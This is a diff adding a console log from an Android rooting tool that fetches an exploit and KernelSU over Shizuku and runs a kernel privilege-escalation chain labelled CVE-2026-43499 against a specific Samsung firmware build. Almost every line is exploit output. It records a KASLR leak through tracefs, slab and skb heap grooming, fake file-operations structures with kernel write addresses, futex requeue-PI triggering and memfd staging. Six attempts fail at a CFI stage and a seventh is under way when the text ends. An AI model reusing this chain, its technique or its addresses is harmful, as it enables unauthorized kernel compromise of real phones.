@@ -1,0 +1,459 @@
+[*] Preparando a execução do Shizuku
+[+] Permissão do Shizuku concedida
+[*] Verificando manifesto de suporte no GitHub
+[+] Perfil de suporte: b0s-S908BXXSMGZB2-cleanup-official-preview
+[*] Baixando payloads
+[*] Baixando exploit
+[*] exploit verificado
+[*] Baixando KernelSU
+[*] KernelSU verificado
+[+] Download do payload completo
+[*] Rodando exploit de kernel
+[+] preload supervisor pid=32674 attempts=24 base_delay=20000
+[*] [trace4-supervisor] phase=before-fork attempt=1/24 t_us=548403656 delay=20000
+[+] exploit attempt=1/24 pid=32677 delay=20000
+[+] startup context pid=32677 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=32677 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=32677 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=32677 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=32677 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=32677 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff8a00e8da00 base=ffffff8a00e88000 object_index=24
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=32677 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff8a00e88180 fake_lock=ffffff8a00e884d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=32677 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=32677 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=32677
+[*] [exp32-launch] phase=memfd-created pid=32677 fd=3
+[*] [exp32-launch] phase=payload-written pid=32677 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=32677
+[*] [exp32-launch] phase=parent-after-fork pid=32677 child=8582
+[*] [exp32-launch] phase=parent-wait-start pid=32677 child=8582
+[*] [exp32-launch] phase=child-after-fork pid=8582 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=8582 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=8582 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=8582 argc=2
+[*] [exp32-enter] phase=before-pread pid=8582 fd=3
+[*] [exp32-enter] phase=payload-read pid=8582 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=8582
+[*] [exp32-enter] phase=threads-created pid=8582
+[-] pin_to_core: core 2 unavailable, using 6
+[-] pin_to_core: core 3 unavailable, using 4
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=32677 child=8582 raw_status=0
+[*] enter CFI stage
+[-] [cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=0/64 zero=0 other=0 fake=ffffff8a00e88180 virtual_slide=00000000001e8000 action=next-child continue=1
+[-] [cfi-trace4] one-CFI observation complete; returning to external supervisor
+[-] [cfi-trace4] child-report pid=32677 cfi=1 step=41 errno=0 leaked_mm=ffffff8a00e8da00 page=ffffff8a00e88000 reclaim=24/24 send_bytes=65536
+[*] [reclaim-life] stage=cfi-fail-pre-return pid=32677 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] [cleanup] resetting pipe attempt before retry
+[*] [trace4-supervisor] phase=child-return attempt=1/24 pid=32677 rc=70 t_us=571978219
+[*] [trace4-supervisor] phase=child-reaped attempt=1/24 child=32677 raw_status=17920 elapsed_us=23676180 t_us=572079836
+[-] exploit attempt=1/24 failed status=70
+[*] [trace4-supervisor] phase=before-fork attempt=2/24 t_us=572080000 delay=30000
+[+] exploit attempt=2/24 pid=8586 delay=30000
+[+] startup context pid=8586 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=8586 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=8586 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=8586 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=8586 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=8586 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff89abb15280 base=ffffff89abb10000 object_index=22
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=8586 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff89abb10180 fake_lock=ffffff89abb104d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=8586 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=8586 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=8586
+[*] [exp32-launch] phase=memfd-created pid=8586 fd=3
+[*] [exp32-launch] phase=payload-written pid=8586 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=8586
+[*] [exp32-launch] phase=parent-after-fork pid=8586 child=14454
+[*] [exp32-launch] phase=parent-wait-start pid=8586 child=14454
+[*] [exp32-launch] phase=child-after-fork pid=14454 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=14454 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=14454 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=14454 argc=2
+[*] [exp32-enter] phase=before-pread pid=14454 fd=3
+[*] [exp32-enter] phase=payload-read pid=14454 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=14454
+[*] [exp32-enter] phase=threads-created pid=14454
+[-] pin_to_core: core 3 unavailable, using 4
+[-] pin_to_core: core 2 unavailable, using 6
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=8586 child=14454 raw_status=0
+[*] enter CFI stage
+[-] [cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=0/64 zero=0 other=0 fake=ffffff89abb10180 virtual_slide=00000000001e8000 action=next-child continue=1
+[-] [cfi-trace4] one-CFI observation complete; returning to external supervisor
+[-] [cfi-trace4] child-report pid=8586 cfi=1 step=41 errno=0 leaked_mm=ffffff89abb15280 page=ffffff89abb10000 reclaim=24/24 send_bytes=65536
+[*] [reclaim-life] stage=cfi-fail-pre-return pid=8586 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] [cleanup] resetting pipe attempt before retry
+[*] [trace4-supervisor] phase=child-return attempt=2/24 pid=8586 rc=70 t_us=594131403
+[*] [trace4-supervisor] phase=child-reaped attempt=2/24 child=8586 raw_status=17920 elapsed_us=22120177 t_us=594200177
+[-] exploit attempt=2/24 failed status=70
+[*] [trace4-supervisor] phase=before-fork attempt=3/24 t_us=594200337 delay=50000
+[+] exploit attempt=3/24 pid=14463 delay=50000
+[+] startup context pid=14463 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=14463 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=14463 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=14463 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=14463 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=14463 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff88ceec4b00 base=ffffff88ceec0000 object_index=20
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=14463 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff88ceec0180 fake_lock=ffffff88ceec04d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=14463 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=14463 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=14463
+[*] [exp32-launch] phase=memfd-created pid=14463 fd=3
+[*] [exp32-launch] phase=payload-written pid=14463 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=14463
+[*] [exp32-launch] phase=parent-after-fork pid=14463 child=20331
+[*] [exp32-launch] phase=parent-wait-start pid=14463 child=20331
+[*] [exp32-launch] phase=child-after-fork pid=20331 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=20331 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=20331 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=20331 argc=2
+[*] [exp32-enter] phase=before-pread pid=20331 fd=3
+[*] [exp32-enter] phase=payload-read pid=20331 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=20331
+[*] [exp32-enter] phase=threads-created pid=20331
+[-] pin_to_core: core 3 unavailable, using 4
+[-] pin_to_core: core 2 unavailable, using 6
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=14463 child=20331 raw_status=0
+[*] enter CFI stage
+[-] [cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=0/64 zero=0 other=0 fake=ffffff88ceec0180 virtual_slide=00000000001e8000 action=next-child continue=1
+[-] [cfi-trace4] one-CFI observation complete; returning to external supervisor
+[-] [cfi-trace4] child-report pid=14463 cfi=1 step=41 errno=0 leaked_mm=ffffff88ceec4b00 page=ffffff88ceec0000 reclaim=24/24 send_bytes=65536
+[*] [reclaim-life] stage=cfi-fail-pre-return pid=14463 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] [cleanup] resetting pipe attempt before retry
+[*] [trace4-supervisor] phase=child-return attempt=3/24 pid=14463 rc=70 t_us=620049807
+[*] [trace4-supervisor] phase=child-reaped attempt=3/24 child=14463 raw_status=17920 elapsed_us=25934927 t_us=620135264
+[-] exploit attempt=3/24 failed status=70
+[*] [trace4-supervisor] phase=before-fork attempt=4/24 t_us=620135442 delay=25000
+[+] exploit attempt=4/24 pid=20580 delay=25000
+[+] startup context pid=20580 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=20580 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=20580 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=20580 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=20580 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=20580 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff890a486540 base=ffffff890a480000 object_index=27
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=20580 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff890a480180 fake_lock=ffffff890a4804d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=20580 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=20580 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=20580
+[*] [exp32-launch] phase=memfd-created pid=20580 fd=3
+[*] [exp32-launch] phase=payload-written pid=20580 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=20580
+[*] [exp32-launch] phase=parent-after-fork pid=20580 child=26259
+[*] [exp32-launch] phase=parent-wait-start pid=20580 child=26259
+[*] [exp32-launch] phase=child-after-fork pid=26259 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=26259 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=26259 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=26259 argc=2
+[*] [exp32-enter] phase=before-pread pid=26259 fd=3
+[*] [exp32-enter] phase=payload-read pid=26259 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=26259
+[*] [exp32-enter] phase=threads-created pid=26259
+[-] pin_to_core: core 3 unavailable, using 4
+[-] pin_to_core: core 2 unavailable, using 6
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=20580 child=26259 raw_status=0
+[*] enter CFI stage
+[-] [cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=0/64 zero=0 other=0 fake=ffffff890a480180 virtual_slide=00000000001e8000 action=next-child continue=1
+[-] [cfi-trace4] one-CFI observation complete; returning to external supervisor
+[-] [cfi-trace4] child-report pid=20580 cfi=1 step=41 errno=0 leaked_mm=ffffff890a486540 page=ffffff890a480000 reclaim=24/24 send_bytes=65536
+[*] [reclaim-life] stage=cfi-fail-pre-return pid=20580 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] [cleanup] resetting pipe attempt before retry
+[*] [trace4-supervisor] phase=child-return attempt=4/24 pid=20580 rc=70 t_us=647463274
+[*] [trace4-supervisor] phase=child-reaped attempt=4/24 child=20580 raw_status=17920 elapsed_us=27386574 t_us=647522016
+[-] exploit attempt=4/24 failed status=70
+[*] [trace4-supervisor] phase=before-fork attempt=5/24 t_us=647522186 delay=40000
+[+] exploit attempt=5/24 pid=26280 delay=40000
+[+] startup context pid=26280 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=26280 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=26280 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=26280 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=26280 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=26280 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff891c0312c0 base=ffffff891c030000 object_index=5
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=26280 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff891c030180 fake_lock=ffffff891c0304d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=26280 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=26280 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=26280
+[*] [exp32-launch] phase=memfd-created pid=26280 fd=3
+[*] [exp32-launch] phase=payload-written pid=26280 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=26280
+[*] [exp32-launch] phase=parent-after-fork pid=26280 child=32511
+[*] [exp32-launch] phase=parent-wait-start pid=26280 child=32511
+[*] [exp32-launch] phase=child-after-fork pid=32511 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=32511 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=32511 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=32511 argc=2
+[*] [exp32-enter] phase=before-pread pid=32511 fd=3
+[*] [exp32-enter] phase=payload-read pid=32511 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=32511
+[*] [exp32-enter] phase=threads-created pid=32511
+[-] pin_to_core: core 3 unavailable, using 4
+[-] pin_to_core: core 2 unavailable, using 6
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=26280 child=32511 raw_status=0
+[*] enter CFI stage
+[-] [cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=0/64 zero=0 other=0 fake=ffffff891c030180 virtual_slide=00000000001e8000 action=next-child continue=1
+[-] [cfi-trace4] one-CFI observation complete; returning to external supervisor
+[-] [cfi-trace4] child-report pid=26280 cfi=1 step=41 errno=0 leaked_mm=ffffff891c0312c0 page=ffffff891c030000 reclaim=24/24 send_bytes=65536
+[*] [reclaim-life] stage=cfi-fail-pre-return pid=26280 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] [cleanup] resetting pipe attempt before retry
+[*] [trace4-supervisor] phase=child-return attempt=5/24 pid=26280 rc=70 t_us=670218041
+[*] [trace4-supervisor] phase=child-reaped attempt=5/24 child=26280 raw_status=17920 elapsed_us=22777413 t_us=670299599
+[-] exploit attempt=5/24 failed status=70
+[*] [trace4-supervisor] phase=before-fork attempt=6/24 t_us=670299745 delay=15000
+[+] exploit attempt=6/24 pid=32526 delay=15000
+[+] startup context pid=32526 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=32526 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=32526 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=32526 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=32526 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=32526 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff8948c492c0 base=ffffff8948c48000 object_index=5
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=32526 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff8948c48180 fake_lock=ffffff8948c484d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=32526 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=32526 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=32526
+[*] [exp32-launch] phase=memfd-created pid=32526 fd=3
+[*] [exp32-launch] phase=payload-written pid=32526 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=32526
+[*] [exp32-launch] phase=parent-after-fork pid=32526 child=8420
+[*] [exp32-launch] phase=parent-wait-start pid=32526 child=8420
+[*] [exp32-launch] phase=child-after-fork pid=8420 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=8420 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=8420 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=8420 argc=2
+[*] [exp32-enter] phase=before-pread pid=8420 fd=3
+[*] [exp32-enter] phase=payload-read pid=8420 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=8420
+[-] pin_to_core: core 2 unavailable, using 6
+[*] [exp32-enter] phase=threads-created pid=8420
+[-] pin_to_core: core 3 unavailable, using 4
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=32526 child=8420 raw_status=0
+[*] enter CFI stage
+[-] [cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=0/64 zero=0 other=0 fake=ffffff8948c48180 virtual_slide=00000000001e8000 action=next-child continue=1
+[-] [cfi-trace4] one-CFI observation complete; returning to external supervisor
+[-] [cfi-trace4] child-report pid=32526 cfi=1 step=41 errno=0 leaked_mm=ffffff8948c492c0 page=ffffff8948c48000 reclaim=24/24 send_bytes=65536
+[*] [reclaim-life] stage=cfi-fail-pre-return pid=32526 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] [cleanup] resetting pipe attempt before retry
+[*] [trace4-supervisor] phase=child-return attempt=6/24 pid=32526 rc=70 t_us=693295472
+[*] [trace4-supervisor] phase=child-reaped attempt=6/24 child=32526 raw_status=17920 elapsed_us=23077656 t_us=693377401
+[-] exploit attempt=6/24 failed status=70
+[*] [trace4-supervisor] phase=before-fork attempt=7/24 t_us=693377610 delay=60000
+[+] exploit attempt=7/24 pid=8433 delay=60000
+[+] startup context pid=8433 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=8433 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=8433 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=8433 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
